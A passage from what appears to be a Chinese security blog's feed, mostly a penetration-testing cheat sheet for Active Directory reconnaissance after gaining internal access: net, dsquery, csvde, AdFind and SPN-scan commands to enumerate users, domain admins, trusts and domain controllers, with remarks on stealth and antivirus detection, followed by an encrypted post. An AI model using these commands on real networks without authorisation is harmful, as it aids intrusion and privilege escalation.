class="line">34</span><br></pre></td><td class="code"><pre><span class="line">net user /domain查看当前域中的所有用户名，根据用户名总数大概判断域的规模</span><br><span class="line">net user xingzheng /domain 查看指定用户在当前域中的详细属性信息</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net config workstation查看看当前的登录域</span><br><span class="line">net view 查看当前域中在线的机器，不太直观，批处理把机器名对应的ip也显示出来</span><br><span class="line">----</span><br><span class="line">host2ip.bat:先获取机器名保存为computers.txt，然后运行下面的脚本得到pic.csv</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> computers.txt</span><br><span class="line"><span class="keyword">for</span> /f %%a <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt;&gt; log.txt</span><br><span class="line">    ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt; %%a.txt</span><br><span class="line">    <span class="keyword">for</span> /f <span class="string">&quot;tokens=2 delims=[]&quot;</span> %%b <span class="keyword">in</span> (%%a.txt) <span class="keyword">do</span> (</span><br><span class="line"> @<span class="built_in">echo</span> %%a,%%b &gt;&gt; pic.csv</span><br><span class="line"> <span class="built_in">del</span> /f /q %%a.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br><span class="line">----</span><br><span class="line">WIN10下使用Net view会出现如下报错</span><br><span class="line">System error <span class="number">1231</span></span><br><span class="line">System error <span class="number">6118</span></span><br><span class="line">解决：https://social.technet.microsoft.com/Forums/en<span class="literal">-US</span>/<span class="number">6</span>f102ed1<span class="literal">-8e76</span><span class="literal">-4cb7</span><span class="literal">-8dec</span><span class="literal">-05714466d441</span>/net<span class="literal">-view</span><span class="literal">-system</span><span class="literal">-error</span><span class="literal">-1231</span>?forum=win10itpronetworking</span><br><span class="line">----</span><br><span class="line">net view /domain查看内网种所有的域数量和名称</span><br><span class="line">net view /domain:domain_name查看指定域中在线的计算机列表</span><br><span class="line">net time /domain查看时间服务器，一般域控会做时间服务器</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net <span class="built_in">group</span> /domain查看当前域中的所有组名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain查看当前域中的域管账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain查看域控制器主机名</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br></pre></td></tr></table></figure><h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Caption,sid获取域内所有用户sid</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;  查询信任域</span><br><span class="line">nltest /dsgetdc:&lt;域名&gt; /server:&lt;域控ip&gt;  查询域详细信息</span><br><span class="line">dnscmd /zoneexport hack7.local dns.txt※【DC执行】导出域内DNS信息</span><br><span class="line">nslookup <span class="literal">-q</span>=mx hack7.local查看域内邮件服务器</span><br><span class="line">nslookup <span class="literal">-q</span>=ns hack7.local查看域内DNS服务器</span><br><span class="line">netdom query pdc查看域内的主域控，仅限win2008及之后的系统</span><br></pre></td></tr></table></figure><h3 id="dsquery导出域信息"><a href="#dsquery导出域信息" class="headerlink" title="dsquery导出域信息"></a>dsquery导出域信息</h3><p>利用dsquery 工具搜集域内信息，域成员机器需要自己传上去</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery user查看当前域中的所有账户名</span><br><span class="line">dsquery <span class="built_in">group</span>查看当前域内的所有组名</span><br><span class="line">dsquery subnet查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery site查看域内所有的web站点</span><br><span class="line">dsquery server查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery user domainroot <span class="literal">-name</span> admin* <span class="literal">-limit</span> <span class="number">240</span>  查询前<span class="number">240</span>个以admin开头的用户名</span><br></pre></td></tr></table></figure><h3 id="csvde导出域信息"><a href="#csvde导出域信息" class="headerlink" title="csvde导出域信息"></a>csvde导出域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果你有一个当前有效的域用户账户及密码</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP） –b &lt;域用户名&gt; &lt;域名&gt; &lt;域用户密码&gt;</span><br><span class="line">如果你可以使用域成员主机的system权限或者当前就在DC上</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP)</span><br></pre></td></tr></table></figure><h3 id="dnsdump"><a href="#dnsdump" class="headerlink" title="dnsdump"></a>dnsdump</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe <span class="literal">-u</span> &lt;域名&gt;\&lt;用户名&gt; <span class="literal">-p</span> &lt;用户密码&gt;  <span class="literal">-r</span> &lt;域控主机名&gt; dump域内dns记录,导出文件名为record.scv</span><br></pre></td></tr></table></figure><h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>C++实现(未开源)，用于查询域内信息</p><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><p>常用命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出域控制器名称</span><br><span class="line">AdFind <span class="literal">-sc</span> dclist</span><br><span class="line"><span class="number">2</span>.查询当前域中在线的计算机</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active</span><br><span class="line"><span class="number">3</span>.查询当前域中在线的计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active name operatingSystem</span><br><span class="line"><span class="number">4</span>.查询当前域中所有计算机</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line"><span class="number">5</span>.查询当前域中所有计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br><span class="line"><span class="number">6</span>.查询域内所有用户</span><br><span class="line">AdFind <span class="literal">-users</span> name</span><br><span class="line"><span class="number">7</span>.查询所有GPO</span><br><span class="line">AdFind <span class="literal">-sc</span> gpodmp</span><br></pre></td></tr></table></figure><h3 id="Bloodhound-Sharphound"><a href="#Bloodhound-Sharphound" class="headerlink" title="Bloodhound/Sharphound"></a>Bloodhound/Sharphound</h3><p>BloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。<br>这里直接介绍需要在内网机器中执行的相关命令：<br>此工具的导出相对来说比较暴力，且目前此工具 exe 原版已经被识别并被各种杀软查杀，包括微软win10自带的杀软 Windows Defender 。</p><p>详细参考： <a href="https://www.anquanke.com/post/id/214046">https://www.anquanke.com/post/id/214046</a> </p><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe，此操作无需管理权限，需域内机器执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-T</span> target.com <span class="literal">-Q</span> */*可完整查出当前域内所有spn</span><br></pre></td></tr></table></figure><p>详细介绍：<a href="http://hackergu.com/kerberos-sec-spn-search/">域安全-SPN扫描</a></p><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><p>详细介绍：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——活动目录信息的获取</a></p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><h4 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;nslookup <span class="literal">-type</span>=all _ldap._tcp.dc._msdcs.hack7.local</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was <span class="number">2</span> seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">86.109</span></span><br><span class="line"></span><br><span class="line">_ldap._tcp.dc._msdcs.hack7.local        SRV service location:</span><br><span class="line">          priority       = <span class="number">0</span></span><br><span class="line">          weight         = <span class="number">100</span></span><br><span class="line">          port           = <span class="number">389</span></span><br><span class="line">          svr hostname   = dc.hack7.local</span><br><span class="line">dc.hack7.local  internet address = <span class="number">192.168</span>.<span class="number">86.109</span></span><br></pre></td></tr></table></figure><h4 id="SPN扫描-1"><a href="#SPN扫描-1" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>在SPN扫描结果中可以通过如下内容，来进行域控的定位。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=DC,OU=Domain Controllers,DC=hack7,DC=loca</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">这项请求将在域 hack7.local 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Controllers</span><br><span class="line">注释     域中所有域控制器</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DC<span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h4 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h4><p>扫描内网中同时开放389和53端口的机器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">端口：<span class="number">389</span></span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line">端口：<span class="number">53</span></span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：<span class="number">53</span>端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（三）</title>
    <link href="https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/"/>
    <id>https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/</id>
    <published>2020-04-25T02:30:24.000Z</published>
    <updated>2020-11-14T19:55:38.110Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="59d8531be019b128b33e6823f2d7df72c8e8c05bdacb5c93a3a27b83cdbf65cf">1415c66757eec6f3f6373e1124982d58d40c3cde1471894fe1991d867eb086df9c253629a3f7c1b33e005b95eefd6f4fdf6267106678ae93e5e2084ac65677d6d2fa8a33b28a3056bdb9ce698bbaa4f3860af54c8c7913040d984319c8f8ab8625dae98edf20e77a3894a8a96647956ec331b711abe7f302ff0823a7492aa3cc97574fa56e4710feb2bf03823848f2c634bc5284cbe8a1f8d4861a6c0e6ffe8e6039e4f10bbeddb728e79da075d1d92b03e829660b96b0c43f5d567514f9025df01868694e38e1ec3ced295790d165f7506c2efc21b099b8ccf6390fcd803311c31f95122c1ae5c1c4eb6760363065aae531cfe80fe6bedec06459d2e462839b5272b88bd8a3e22eb5f7804c05e228ef6336da0085c4872267e5691d7c8004341264a2bad20aba240faf6121494ba810b94a1ddba65b2a319fb1335127cee763ccb6f6e35d8af18339cc673c3210f131b8990e024a7c9998802dbc707ac66bc888cf7d4e7af95692fe16e2e12f57893ff325c571cf98bbbc8e5b6acb249a54eb4be6ffd5d68b27566da57f63b99364cdfff49ba0471222dc2b3ba09f9643b829d9123bb68c8c040c0c3326514aa75ef7baed0527766914ab6839db89e4b29ca3fa2569ab00899d49165bedc53e806e4b9e46c22472f27560cc258ca69d5f05a15badf80066b12a3cecae4bdb1b7c44174748fa2d0629f6c16d89d452dcd0d0908aaab11f0a2a338ca1fa1e32af63b86f9e6c024f361fc281599d1ce76fcfb554643d9ac1ca76bcfdfb48992a4a65d7e32270a1c8c229f22ae72435f042695a36bfaf3301d1bedad32e1d7562ef3266af51af537aede45e8005f4a115bbe83fc1a53be1e526b06c2e4b203a9c41fbf227b34c3ca478d8c7a5eb7a9ff8fad917181e6545d19db203aebcca298c7b9f1fb2b7864ed6c3ccd520efce35b2d8926713aa9a9fea7f94a94ca9bb75b1aa4d19ce8c60a23e0c342af8a34414bc9765bb13ba519bdc1b07b36bbd8da1f3444925e45a58d54bc42829bc99376a2eda3ff781287ecafd375088033407327e294e100da5c24261d4977a9e6467957270109dfc9d2ca3f5277372ee36d2bf84e04f3d24f3de6838a0369ad7023c3cd8904c67390b20a0bb18eede9a4a816002475bb1b135362c1127ecf283734b64be7c13bfd83e268991f993a716f2bd341eee97b615e5863ea889a7f0e7d6d090025635dca0c29f1257fad7b45c276143504d27c5a83347b6feaf8be95bc38fe70cdceca2515b6dd4f1290f54fb29539e16a5f6d016f88ebd4faabbd1978f26402d8c72df4918fcacc18ca41e81dc0ac8c2297258829e8a54d5505da65cfa22f74079783ab727c3e70968e6e21181f5aded19cb33ab790ba8b164492afe61bf7e41e0a29a266fdd410c5d9123ddbf4a13719fa4c02e1f606eb4822e11d2cf30f9b8d96043c8f5ac370d6f35a85dcd6f2c3f9942a4b800c5516d1f1ca4f31919d97512ea90847300ee79928d50bcf4c523d333f47a94c26a1c96646813f1b329e4a40a079ae2a6eb7e5510d16c1d7c826f952170b2d1d01d411318087babfbe41cf21b272020886f1ad145042013d053af27b13b5600a472943c28156858c5571065ad65475859f5e533a8e8d01ad39f14a80ae678b59fadd94983205af733dde9bc3a6f00f6b0c106395a6e4deaf3846af3b63e23f059ebfc84fac305abfec7a047ef9c9c4764eb89059030ff26542087046975b1c8c239cf26270ba1ae43f0b262e872d6a85a579eeea54c9144c88c84e30896f56812ad1caf44a368c3ae5e1556a6c53769730f33505f303ff0b6e39ee772d8e20d90c0f065682fa4e70d28a141bf0598667c552ec1a951ddf0b4d62c6c262b15efa381e084fd5428cc2f4d054976a62315e54424ff5bc6ddf6b51a4cf457de5c3e5e17b6bfeef67a3d3e2196d1410b663069a1238867a9b004994f58254cd97b6db74d12b5a8859f95affbdd769929aa1839ccf81ff2708c9bb7c1754077bb2c4a035da4b656a7935cfd62483782b2c9c5b6d0180d40c867f919740aeed949f204b3e7a90594ab5d1dca3caf3425f9dc1addf7419f7045a6a4fb4a4e54e76ca41b74032856ab7a5116af6d6475d82460ab87ee6d042f86cc9a69cb1535e2cf0093e96bb2a9b942c5a33b8b7e9b186ae59b5b3957254039807fa22541e2b53d5b99c4459f3a64f3479296edec7e282eb6cc79391236dd801ee8c84d5c82c42c74a4b0fa68091402a8c51bb89c7dd056533da59cbf17a0d2942541e7a78d9ae571cb85d585ac737168e8bf036e90ef35a8136a615010392eb7a4ac114a252e14c5d26e70a882a789b3de7bc58348af1aee307b95289f46558e0cd5aba07ffebbdfb361e23436ddb94b47169fbafdcd123702fa21197af1c8354a09048e076832f4870ac1a61205e94ec788df09755d3090ec1640b81d8ffe3f9730a965e97a0b91b7e2b662a142b503c8a317cc25d9fa0278222b795b6fe0b0596c3b31ef91b6e13743649b6f91ce12960acb30f5b6df15ce5da9f46ae984c8d6cafb0697c44f215825abcec2d81c8e2b85495f50af07b5529472732fa33505008ed54cda8eca107ebc685c2320a978ce95f0aa492573a0efdd245eb6fe5b0c3042f7064f3d2b1c0df50b8c039b049a80457f8a0233d47e85797fd52672432795e57fe290f2067fe0159a67ab58b49720f874cbd665d0d593a8445d0a13fe22698a5062add2038a9a6e2f84404e911205cd87c4ba23a8f5dff103ed1eacb55adc92f6ae2b89c72c47c39a9f6ac64e3b9ebd9c7c95d3819ffc85ac2a843d74d21c378f73e0815ae6af0c501848573a985532a32fcaf65f4fa34d2efcddc7875433059c7279f0d43966594a41dee62341477595454d5fc1430693a42c8702caba7eeeb4106b6e3e94076af784e5c63f900d076e8ca41707d42db98718c18503b6edf835d6078c6fc3fc420d6a7d289e301542738a73b78d738280937905304a72d541b8984959e5f7df80a80d781792d53c4161e4a693ee76b433011f9534142a735987f649e7d4fcab413dd1867e9cc7b7088cb8eb01f74f918bc35c4441fe0ffeb038842d4669163452a35bab7c7499b4f7a8c235aacd37214df421d18ce5984451d0701748f6873c24e6d7cbc29f23bd2697846780255701760bf4e2d1fcea45159426dfabd947d31e0171723d6e685463b13d55bddafc8297c720f1a0fb8f68a321399c9d4dafdad123e5953f64417c0df504f5be73427b6df51b6336ffef50951fabbee1e0ce309665797dbd8179509b9dbcd5928204d1ee631fb1696ee927a9c1f79c29764b1c386cc08de67e7c7f8b2ffa06ffbe6ac876704ab31afc649307fa9f3abcd6682e2c760ac78864480ee3c27e4ff22b2f3b8400519d313c2fd214dea433a747ed7b7ea2ba3dbd0c37f40bb56d734146e90feb3f4221e3e476c53106409c237b2d7ae970a3f2cae252d5fbb3f10b00192599dbd009d6ec86daeb5b75c8836b8c14ffc7278df9ab6d6834c60ca90a1671fd31b444308b8917c115f470112f818fbf4134b26ee770714790440eb6c9ebbb5426731cf82fe8ee54065b39c3b54f71500095b1711c74ae8568337a476758f7122f2ba98ba253ee418fa205c5eb95993b463a4dab3d6baf4e84ec91274b7137de92462b2441ea6cefb07039dbad065c7a3d0e2b926834295a7bda2446c14d111069224900b87f5f81462e4471b037b0f292aa99a0882afb59f30ee10f3f10e9caeaae9bc906d0de1093857c3d276f3212dc361b1e3ec09127b00690c97e71f3c1e4417fae391a60bbc55944133b0750ad4f6b876b0a10de2e24e74ba1fbb38f9e4e70b574968a38494a2473d162a2be748554fed5f6867bafe43b024dcf407d69972798427e97d1f84220d4afa22bdaccfbbca9bdc86f449374eb5eda17c1c1aaab03e0182231b9de360c67ff27b43148da30f56a4c617f1879f24105111d711b63cef63972bea35529e1f97aaf5b46afe9eb3f4e586118da3faff8b6139a2db762285bb95732f8ad51575f5e0c9f08b77c2dd3057064bf40e4f24da93e1e498fad16fc0e7cd1c5d2908c021e705f54a000e47f41dbd712fcb34a1ea33f67603e683a265ac09ed0fb777ac3963c66e97b6357a667530f9817a5fd9299e6d8d4b9080cc7ce04908aa5136e4239b3a521791931d68ec6861054b5c11fe4172a5a7559c91828441d4fe79387844a9e33d680a5fc59e64dcfce5bc03bca88981c5081068cf03e57487963bf50cde2cd26d6acec847a652170b12528d1edc68482d4787c7c75e0d24d3a127aea67f07821082da425965a470a5d1984c184d14dc0629685db2ef29a9c338bd133adf56b9025186dee93ed0a4dedff5ac10bb0991a3c7b0c7696956d57a19662a7fb378c9e18be44fc6e76f5f3277416dac518c0db516f69f9b2b8d2eb5fe666b9e4d6af4c23a7e835921c4f1be83498de59477f733108461571d0b996817a2aad0e55cc2d42111742175c69268998a707c3f69f90c35557c1be4e3f7e17da692ac3467785f253f91dc63e350b002fc03ae99f85b202bd3099c77f76491834fc59eb92cd5d95f35571ea3c5ac3b6ec395a85575b5fafda636988ef364e7de1e752eea7ea30a55c7a948a14d910256c71b90acfa483c0f990732c3adff07fe22a0a2f6be17fef0f41fc620d2e8ab282bc18f434220b807ccc3ab77d6e845339d5470d3bbf86f28b53a213c31757801d07a3c0970aa089b67a25654de0a4d8f16c0f48dac2fff6c3116459b3cc0bbcd131c05a9a08b71a77de884e0271fe3e0bad3dfa44d60a79983addf5a26d09e405ddc8be3b9336c2d3de41edc25dd3573dbb826ebd7f67e548e81110b94dc2bb4183f06859ed1a311f3232b4cfd84763cb0af55a147974ace46e313d24e09f5ae5c8b34b11b3f4ee636f917f781a4cae260ff2e6b1546a1400f95a8e88de94e5d6f02277d144b5bbcd6051436b9e8dbbb6d3f035fe014f4254c9501cbc9c96b5756707d92f769b907033e48d47be038c9d00f999caa34676ee42a5f14e8c33df0bf3502db760d619757f9b303d82321cad74a6a2cf1f1ebd0c3c3d7e18436b9e5bf278d3308db95bb7751b2cf529f6f8e87c4bf71566435784cfaac479fb7a9bc8f26b2fcece79f0e9da661f2cb77facbc2a439b3d1bc79ed41e5abf9aae8434d349db221463d3067ddb7b8e03bcb922bc90fc8d884a5611a5c5054cbe5917b4bdd92d04cafbf02b5becad02ed5ceaf72f916e11481f7687648b8f26ec4c98c75a8c3f31b91d0a558b42d7a40711810d7dea6fa0c9a776332551772cbb87a04bf6444b15f5faddc775a4aed80896b4a81949d5bd129b384e4d19227e93ac09e3ae48ae22f416b1ece1f438218ab7c455ec8c556bdee24cd330211898109cd51afc402480cc1bc7a8a4ce824179cb62253b8ed74f77db1e9a9cf5ee5f09807bd3b0bd3b7b8c08708e5673a627a4da0e3de6d4e90f86b7640e8604efa25ff74a2fc06167c248ac0ea408a36145a5b2bfea3c8561070104e3252acd7e82f9e12d3900c795962cedcf79526903e69f44f2860498277137113611db341663e586a15744ed0cbaea37db863192d71cc8ffbda87d6d928baecd5e84458293e3797e2a458ef3ea9eba994fefb24c92b182162451df31089f929f7cce435c54e0f0921164f822d8b989e120d919537a95a5b469ee5ec99386dc05c5f3c1c292cc50b14cc0545b486c9e388a714884c7636571e56d10edeb00659b9ecac8a6b5f1f6bab761dfc9ecfae6bf218549ee59db6d4827aed880f94dfcd8208c59aba6b6aa49117263eaad6f6ea39e7fd1a48f2f19602951b8962fc38c32ca3418793e8feead4888b5d30f315a157918e9d5e98dc29f5d4dd4284c5815ef7037c95d683bc5fa397ff02ae3e919681ed54edad2afeffa9fd3da940825fda0890111188ae2e9b04831d1fa88b3f770ba91ce45db191690a117e749eff2fc2585b054a1f7300f22b9a5942400d7e81105d79192ec528bc57668db00e2cbd326a7087c6d88808ed22ac34f9a54533ddb5567720ec4be8182fe256a6d59ab9d8ef645152f97bf5e4c2e0ffafea15c6ee0ea8d8abc30cb936c06db59a3de26a4513b4717a6a902ad378a4698ff53ee14989f952632c47203f0fca6362c74ca48560bbd4ac33c38cc7a3bb3be664fb1882d764aa787710ca42789b187745cf4073c1f67adfa5af690520497e8744ada051b0645ef870eefa57e42e6eb31ab3dc765ca2c99b8a1839b9441ec42a31f51650579ded569c1061dcd5bd0bb5c8ad0e06ad9524bd5318a12bb6919cc6c77b2345a766694cc334b4a383c0c59f977660fedcff4059530c7de191f5034a81f24bc7fd4641bf9c7b790bf5acdeb322fc3441f883d676ce3be8aa2121b3bf65895714f06b520cc9018c935ecd759dae20c97bc7d43324b8010233bb519366792ef631e5726f30e35345212d02c9ed8eae2f44ea6fc07cfb0647c3c3d01b9e2b6efa6215092bf97660bfc3b0e58868e6268bccd65a7530836c22a6b2ad61a414df28a0439409c013de35450db24e3bbf91cad1eeb9b4e3aa0d2bb13bbedcf0d485e97987c3c06b7e75b61a0cc3154707470eb3930cf6360c5426214afd3d0cdbdd679946085f1074dd0ad235d7438bd44d272112704aff33600b4b5e92f5681def8a7cc2384f4256f3b7004fea45ecd130016097fdf0ec8c68a5d933ff49b0f552e7cc969309a02610559e1fc8727c8046e475861c62227e4d2a5a2603b3284e3795e14ab6e20cad9556c751edf099839fa3796db54cbf49addd74a5c31458b9f985348c084095d3f7490a07505816d362fc8a90be6f8b29a840e1f7237d84bf486ceb6b0b63d41bf4595e55d3a941539d2fadd5de6086490caa17c5d1017d5aa41f022296b23a751ca6e6cdb8714364aa818c3ac054fa1521eff2e15c210ba1167367a39872bccb595fd518dd4791ade6761d67eb1daa3ca1bc13063239bb8d97e18e88a3506f8c7bb670bea2ff81839516e28a8d3163ee4e5731501be2207018e00e7b29701d565207ca937df306ba468e2ab8f17a4687f3059af97bc074f1cb0ba8475d26743aeb7ecea9cfcd5b2ef2cbe7c7696e3c1b121ee3416ec421fe239aaa2fe2f32aaec8902573bc363354bb0c7dc86c972b7a7d1812b362ac0c3b59a140bd27c876a51d938a57d48c5194f08847fad8c1d47d2ba82c5a353a48a1a24173deca32fad140f97f76e5743166041a8d239a5543d9b73150a8b11e846277d40bb130de45e9480978ee537f328c37d163c4084e40abd6b59a05dcc09f2cccafbe691faf5ffe59f87500779df00d7f90800ddd7ac9913e4a39af072d7f2a8db44ba642dc1efb25ce8f12ec1730eb42856d4e8da335dd76da9ca00c542367bf23f8e6186f550c80b0a3df586304c8e4e8acbd57d0d667496e7d64ff05b3011b0b850526e99a3c16168876e28a21140c7a36db8460d2e1751091344dde7cbe3d2f94f8fae2fd5ebe7609001b7f3261a7f7b0f56b1fc869936ad3a1f5a56136f8a0bce17e2c56108f69fff6a3568b712bda9c298414393137d4712a405c213b4578f06ff2e600818a4f5e3fdd821c7c247e972ab658efe1c28def2248e737830a0ad7e01fd036bc42a9b66f95e915bb19dc3c50c6e2c04d396819f9f37d2a11805f7146aecbcde6de7b6eed150410d2f798076e8f685ad3e269d113a2e5e314122fbcc809587ebc3458757d8bcaf9a634cf2ffa6a2643bb38a337633c371564cdacc35d95f540dcf380f1d6c7c4c7a4a241770f182664f944c0a9d744f755b5a18984aa137cab1a7059f16a19e30200ca8856ff99345932363a231647bfb17db838bdee1655b3e06db05e32f7905f9c68e01cc1240ee77a7d382a37181f797578a0583f1a3b112adc114335f0df4c11e4c532829d11b5d5a73ec468124af13f78fcf7b7281a0e17719178ec50b12b142bd0244b82fcf1060f2181a7527d7ac6096de8b9ad3147b38b84a10ce577fbcde9900fcb3ce236335878f4a454fa9b49573d1799d57821940d80d25f449e4aab13d00f34f2206254834146c56916f5760be2065c2d3927457da984aba0e2dc1096fe938c7f